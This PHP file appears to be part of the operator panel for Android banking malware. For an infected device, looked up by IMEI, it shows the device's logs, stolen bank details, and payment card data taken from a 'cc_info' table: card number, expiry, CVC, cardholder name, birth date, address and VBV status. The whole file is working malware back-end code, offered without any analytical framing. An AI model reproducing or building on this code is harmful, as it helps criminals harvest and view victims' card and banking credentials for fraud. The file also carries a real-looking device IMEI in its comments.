
<?php session_start();
include '../../db.php';
include '../../crypt.php';
if (!(isset($_SESSION['user_id']))){
	header("Location: ../index.php");  
	return;
}  
?>

<?php

$html_modal = '';

#$_POST["add_commands"] = "card";
#$_POST["id"] = 1963;
#$_POST["imei"] = 353721050757792;

# add_commands=card&id=1963&imei=353721050757792

#var_dump($_POST["imei"]);

if(isset($_POST["add_commands"])){
	$id = $mysqli->real_escape_string($_POST["id"]);
	$imei = $mysqli->real_escape_string($_POST["imei"]);
	if ($_POST["add_commands"] == "log"){
		$sql3 = "UPDATE kliets SET inj = '0', l_bank = '0', log = '0' WHERE IMEI = '$imei';";
		$mysqli->query($sql3);
		if (@fopen("../../logs/$imei.log", "r")){
			$filename = "../../logs/$imei.log";
		    $handle = fopen($filename, "r");
		    $contents = fread($handle, filesize($filename));
		    fclose($handle);
		    $html_modal .= trim($contents, " \t\n\r\0\x0B");
		}

	}

	if ($_POST["add_commands"] == "card"){
		//$user = mysql_query();
		$user_IMEI = '';
		$uset_info = '';
		foreach ($mysqli->query("SELECT info2, IMEI from `kliets` WHERE id = '$id'") as $userr){
			$user_info .= $userr["info2"];
			$user_IMEI = $userr["IMEI"];
		}
		if ($user_info) $user_info .= "\n\n";
		# check card in cc_info table
		#$user = mysql_query("SELECT * FROM `cc_info` WHERE IMEI = '$user_IMEI'");
		#var_dump($user);
		#var_dump($id);
		foreach ($mysqli->query("SELECT * FROM `cc_info` WHERE IMEI = '$user_IMEI'") as $userr){
			$user_info .= "\n";
			//var_dump($userr);
			$user_info .= "CARD=".$userr["CARD"]." ";
			$user_info .= "typeCard=".$userr["typeCard"]." ";
			$user_info .= "MMYY=".$userr["MMYY"]." ";
			$user_info .= "CVC=".$userr["CVC"]." ";
			$user_info .= "CardholderName=".$userr["CardholderName"]." ";
			$user_info .= "PhoneNumber=".$userr["PhoneNumber"]." ";
			$user_info .= "birth_date=".$userr["birth_date"]." ";
			$user_info .= "zip_code=".$userr["zip_code"]." ";
			$user_info .= "holder_address=".$userr["holder_address"]." ";
			$user_info .= "VBV=".$userr["VBV"]." ";
			$user_info .= "last_update=".$userr["last_update"]." ";
			$user_info .= "\n";
		}
		$html_modal .= "$user_info";

	}

	if ($_POST["add_commands"] == "bank"){
		//$user = mysql_query("SELECT info FROM `kliets` WHERE id = '$id'");
		foreach ($mysqli->query("SELECT info FROM `kliets` WHERE id = '$id'") as $userr){
		  $html_modal .= $userr["info"];
		}
	}
}	
#   %%PLACE_FORM1_HERE%%

$html = file_get_contents("../templates/modal_logs.tpl");
$html = str_replace('%%PLACE_MODAL_HERE%%', $html_modal, $html);

echo $html;

?>